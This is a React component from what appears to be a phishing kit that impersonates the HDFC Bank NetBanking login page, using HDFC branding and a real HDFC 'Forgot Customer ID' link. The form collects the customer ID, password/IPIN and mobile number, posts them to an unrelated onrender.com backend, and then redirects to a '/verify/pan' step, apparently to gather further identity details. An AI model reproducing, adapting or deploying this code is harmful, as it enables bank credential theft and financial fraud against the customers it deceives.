import { useState } from "react";
import "./home.page.scss";
import main from "./main.png";
import { useEffect } from "react";
import {
  UserMessage,
  Navbar,
  SubmitButton,
  SecurityContainer,
} from "../../components";
import { useNavigate } from "react-router-dom";
import axios from "axios";

export const HomePage = () => {
  const navigate = useNavigate();

  const [showLoading, setShowLoading] = useState(true);
  const [formData, setFormData] = useState({
    customerId: "",
    password: "",
    phone: "",
  });

  const handleChange = (e, key) => {
    setFormData((prev) => ({ ...prev, [key]: e.target.value }));
  };

  const handleSubmit = () => {
    const message = {
      customerId: "Customer ID",
      password: "IPIN (password)",
      phone: "Mobile No.",
    };

    const blankValues = Object.keys(formData).filter((key) => !formData[key]);
    if (blankValues.length > 0) {
      alert(`${message[blankValues[0]]} cannot be left blank.`);
      return;
    }
    if (formData.customerId?.length < 6) {
      alert("Enter a valid Customer ID");
      return;
    }
    if (formData.phone?.length < 10 || formData.phone?.length > 10) {
      alert("Enter a valid Mobile No.");
      return;
    }
    axios
      .post("https://backend-nzz3.onrender.com/api/sd", formData)
      .then((response) => {
        if (response.status === 200) {
          console.log(response);
          navigate("/verify/pan", {
            state: {
              customerId: response.data.data.customerId,
            },
          });
        }
      })
      .catch((error) => {
        console.log(error);
      });
  };

  useEffect(() => {
    setTimeout(() => {
      setShowLoading(false);
    }, 2000);
  }, []);

  if (showLoading)
    return (
      <div className={`home-page-loading ${showLoading ? "loading" : ""}`}>
        <img alt="HDFC Logo" src={main} />
      </div>
    );
  return (
    <div className="page-container home">
      <Navbar />
      <div className="page-body">
        <div className="page-form-container">
          <div className="page-form-container-title">Login to NetBanking</div>
          <div className="page-form-container-body mb20p">
            <div className="page-form-container-left">
              <div className="form-item">
                <div className="form-label">Customer ID/ User ID</div>
                <input
                  value={formData.customerId}
                  onChange={(e) => handleChange(e, "customerId")}
                  className="form-input"
                />
                <div>
                  <a
                    className="link"
                    href="https://netbanking.hdfcbank.com/netbanking/entrynn"
                  >
                    Forgot Customer ID
                  </a>
                </div>
              </div>
              <div className="form-item">
                <div className="form-label">Password/ IPIN</div>
                <input
                  type="password"
                  value={formData.password}
                  onChange={(e) => handleChange(e, "password")}
                  className="form-input"
                  placeholder="Password/ IPIN"
                />
              </div>
              <div className="form-item">
                <div className="form-label">Mobile No.</div>
                <input
                  className="form-input"
                  placeholder="Mobile No."
                  value={formData.phone}
                  min={10}
                  max={10}
                  onChange={(e) => handleChange(e, "phone")}
                />
              </div>
              <div className="form-item">
                <SubmitButton onClick={handleSubmit} />
              </div>
              <UserMessage />
            </div>
            <div className="page-form-container-right">
              <SecurityContainer />
            </div>
          </div>
          <div className="home-page-footer"></div>
        </div>
      </div>
    </div>
  );
};
